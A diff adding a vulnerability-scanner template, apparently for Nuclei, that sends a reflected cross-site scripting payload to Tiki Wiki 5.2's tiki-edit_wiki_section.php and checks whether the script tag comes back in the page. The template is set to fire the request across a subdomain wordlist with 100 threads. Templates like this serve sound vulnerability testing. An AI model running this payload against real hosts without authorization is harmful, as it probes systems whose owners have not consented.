@@ -1,0 +1,31 @@
+id: tikiwiki-reflected-xss 2
+info:
+  name: Tiki Wiki CMS Groupware 5.2 Reflected Cross-site Scripting
+  author: madrobot
+  severity: medium
+  tags: xss,tikiwiki
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+    raw:
+      - |
+        GET /tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<script>alert(31337)</script>"
+        part: body
+      - type: word
+        words:
+          - "text/html"
+        part: header
